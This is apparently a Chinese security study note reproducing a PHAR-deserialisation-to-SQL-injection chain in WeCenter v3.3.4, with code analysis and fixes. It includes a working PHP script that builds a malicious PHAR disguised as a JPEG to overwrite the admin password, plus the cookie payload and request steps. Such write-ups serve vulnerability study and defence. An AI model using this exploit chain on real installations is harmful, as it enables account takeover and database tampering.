---
title: WeCenter v3.3.4 前台 SQL 注入漏洞完整复现：PHAR 反序列化链攻击
description: 详细复现 WeCenter v3.3.4 前台 SQL 注入漏洞攻击链：通过 Cookie 注入恶意 Phar 反序列化载荷，经数据库存取触发
  file_get_contents 反序列化，最终在 aws_model.inc.php __destruct 魔术方法中实现 SQL 注入
category: program-analysis
tags:
- WeCenter
- SQL注入
- PHAR反序列化
- 文件操作触发
- 魔术方法
- aws_model.inc.php
- 前台漏洞
- 漏洞复现
date: '2023-04-13'
updated: '2026-11-15'
---

## 漏洞概述

WeCenter v3.3.4 存在一个前台 SQL 注入漏洞，攻击链完整路径为：**Cookie 注入恶意 PHAR 载荷 → 数据库存储 headimgurl 字段 → 后台同步头像时读取数据库 → file_get_contents 触发 PHAR 反序列化 → aws_model.inc.php 中 __destruct 魔术方法执行 SQL 注入**。

该漏洞利用了 PHP PHAR 反序列化特性：当文件系统函数（如 `file_get_contents`、`fopen`、`file_exists` 等）处理 `phar://` 协议封装的文件时，会自动触发 PHAR 文件中存储的元数据反序列化。结合 `__destruct` 魔术方法在对象销毁时自动调用的特性，实现了从文件操作到 SQL 注入的完整利用链。

## 核心漏洞点分析

### SQL 注入触发点：aws_model.inc.php `__destruct` 方法

文件 `./system/aws_model.inc.php` 中存在反序列化利用点：

```php
// 遍历 _shutdown_query 数组，直接拼接执行 query
public function __destruct() {
    if ($this->_shutdown_query) {
        foreach ($this->_shutdown_query as $query) {
            $this->query($query);  // 直接拼接，可造成 SQL 注入
        }
    }
}
```

`query()` 方法直接拼接 SQL 语句，无参数化处理，若可控制 `_shutdown_query` 数组内容，即可实现 SQL 注入。

> **相关技术背景**：PHP 魔术方法中 `__destruct` 在对象销毁时自动调用，`__wakeup` 在 `unserialize()` 时自动调用，`__construct` 在 `new` 对象时调用。反序列化利用常结合 `__wakeup`/`__destruct` 构造攻击链。详见 [[php伪协议与反序列化利用#魔术方法与反序列化利用链]]。

### PHAR 反序列化触发点：account.php `file_get_contents`

文件 `./models/account.php` 中 `associate_remote_avatar` 方法：

```php
public function associate_remote_avatar($headimgurl) {
    // ...
    $content = file_get_contents($headimgurl);  // $headimgurl 可控
    // ...
}
```

`file_get_contents` 接受 `phar://` 协议，当传入恶意 PHAR 文件路径时，会触发 PHAR 元数据反序列化。

> **PHAR 反序列化原理**：PHP 文件系统函数处理 `phar://` 协议时会自动反序列化 PHAR 文件中的 `metadata` 元数据。这是一种不依赖 `unserialize()` 直接调用的反序列化触发方式。详见 [[php伪协议与反序列化利用#PHAR反序列化利用链]]。

### 数据流向：Cookie → 数据库 → 文件操作

完整数据流向链路：

```
Cookie (_WXConnect) 
  → binding_action (app/m/weixin.php) 解析 JSON
  → bind_account (models/openid/weixin/weixin.php) 入库 users_weixin 表 headimgurl 字段
  → synch_img_action (app/account/ajax.php) 读库
  → associate_remote_avatar (models/account.php) 传入 file_get_contents
  → PHAR 反序列化触发 __destruct
  → aws_model.inc.php query() 执行 SQL 注入
```

## 攻击链详细复现

### 步骤 1：构造恶意 PHAR 文件

生成包含恶意对象的 PHAR 文件，利用 `AWS_MODEL` 类的 `__destruct` 注入 SQL：

```php
<?php
// 3.php - 生成恶意 PHAR
class AWS_MODEL {
    public $_shutdown_query = array("SELECT 1; UPDATE users SET password='evil' WHERE uid=1--");
}

$phar = new Phar("evil.phar");
$phar->startBuffering();
$phar->addFromString("test.txt", "test");
$phar->setMetadata(new AWS_MODEL());  // 设置元数据为恶意对象
$phar->stopBuffering();
// 重命名为 jpg 绕过后缀检查
rename("evil.phar", "evil.jpg");
?>
```

> **PHAR 生成技巧**：PHAR 文件后缀可任意修改（如 `.jpg`、`.png`），只要文件内容符合 PHAR 格式，`phar://` 协议即可正确解析。详见 [[php伪协议与反序列化利用#PHAR文件构造与绕过]]。

### 步骤 2：构造恶意 Cookie 载荷

将 PHAR 文件路径编码进 Cookie 中的 `_WXConnect` 字段：

```json
{
  "access_user": {
    "headimgurl": "phar:///var/www/html/evil.jpg"
  }
}
```

Base64 编码后作为 Cookie 值：`_WXConnect=eyJhY2Nlc3NfdXNlciI6eyJ...}`

### 步骤 3：触发漏洞链

1. **发送恶意 Cookie 访问绑定接口**  
   `GET /m/weixin/binding HTTP/1.1`  
   `Cookie: _WXConnect=<base64_payload>`

   服务端执行流程：
   - `binding_action` 解析 Cookie → `$WXConnect`
   - 调用 `bind_account($WXConnect['access_user'])`
   - `headimgurl` 存入 `users_weixin` 表

2. **触发头像同步**  
   访问 `account/ajax/synch_img` 接口：
   - `synch_img_action` 读取数据库 `headimgurl`
   - 调用 `associate_remote_avatar($headimgurl)`
   - `file_get_contents("phar:///var/www/html/evil.jpg")` 触发反序列化
   - `AWS_MODEL::__destruct()` 执行 `_shutdown_query` 中的 SQL

## 关键代码调用链图解

```mermaid
graph TD
    A[Cookie: _WXConnect] --> B[binding_action<br/>app/m/weixin.php]
    B --> C[bind_account<br/>models/openid/weixin/weixin.php]
    C --> D[(users_weixin 表<br/>headimgurl 字段)]
    D --> E[synch_img_action<br/>app/account/ajax.php]
    E --> F[associate_remote_avatar<br/>models/account.php]
    F --> G[file_get_contents<br/>phar:// 协议]
    G --> H[PHAR 反序列化<br/>metadata → AWS_MODEL 对象]
    H --> I[__destruct 魔术方法<br/>system/aws_model.inc.php]
    I --> J[query() 直接拼接<br/>SQL 注入]
```

## 防御与修复建议

### 代码层面修复

- **SQL 注入点**：`aws_model.inc.php` 的 `query()` 方法应使用预编译语句（Prepared Statement），避免直接拼接。参考 [[java-preparedstatement-sql-injection-defense#预编译原理与参数化查询]] 原理，PHP 中应使用 PDO 或 MySQLi 预处理。
- **反序列化点**：`file_get_contents` 接收用户可控路径前，应校验协议头，禁止 `phar://`、`php://filter` 等伪协议。详见 [[php-file-inclusion-vulnerability#伪协议利用与防御]]。
- **PHAR 元数据**：生产环境可通过 `phar.readonly = On` 禁止 PHAR 写入，但无法完全阻止读取触发反序列化。建议在反序列化入口处实现 `__wakeup` 校验或禁用危险类的反序列化。

### 配置层面加固

- `php.ini` 设置 `phar.readonly = 1` 禁止生成 PHAR 文件（但不影响读取触发）
- `disable_functions` 包含 `phar` 相关函数（效果有限）
- 使用 `open_basedir` 限制文件操作目录范围
- 部署 WAF 规则拦截 `phar://` 协议请求

### 通用防御策略

- **输入验证**：所有用户输入（Cookie、Header、Body）均需严格校验，特别是反序列化载荷入口
- **最小权限**：数据库账号遵循最小权限原则，避免 DBA 权限导致写 Shell
- **审计日志**：记录关键文件操作、数据库写入、反序列化异常等行为

## 相关技术交叉引用

- [[php伪协议与反序列化利用]] - PHP 伪协议、PHAR 反序列化、魔术方法利用链系统梳理
- [[php-file-inclusion-vulnerability]] - 文件包含漏洞成因、伪协议利用、防御绕过技巧
- [[thinkphp5-deserialization-chain-analysis]] - ThinkPHP 5 反序列化链分析，对比不同框架反序列化利用模式
- [[xd-security-deserialization-xxe-notes-day37-39]] - XD安全课程 PHP/Java 反序列化、XXE 学习笔记
- [[sqlmap-api-automation]] - SQLMap API 自动化检测，可用于批量验证此类注入点
- [[web-cache-poisoning-techniques]] - Web 缓存投毒技术，理解缓存层面的载荷投递与触发机制

## 时间线与来源

- **原文来源**：微信公众号文章《WeCenter v3.3.4前台SQL注入漏洞复现》
- **参考学习**：先知社区文章 https://xz.aliyun.com/t/7077
- **复现日期**：2023 年 4 月（基于微信文章 sessionid 时间戳推断）

## 小结

WeCenter v3.3.4 该漏洞展示了**前台用户输入 → 数据库存储 → 后台功能读取 → 文件操作触发 PHAR 反序列化 → 魔术方法执行 SQL 注入**的完整攻击链。核心利用点在于：

1. `headimgurl` 字段未校验协议头，允许 `phar://` 协议
2. `file_get_contents` 等文件函数自动触发 PHAR 反序列化
3. `AWS_MODEL` 类 `__destruct` 直接拼接 SQL 执行

此类漏洞提示：**任何用户可控数据经存储后进入文件系统函数，均需警惕 PHAR 反序列化风险；同时魔术方法（`__destruct`/`__wakeup`/`__toString` 等）中的危险操作（SQL 拼接、命令执行、文件写入）是反序列化利用的关键汇聚点。**

## 来源

- [226安全团队-201805-202103_08](../sources/226安全团队-201805-202103_08.md)
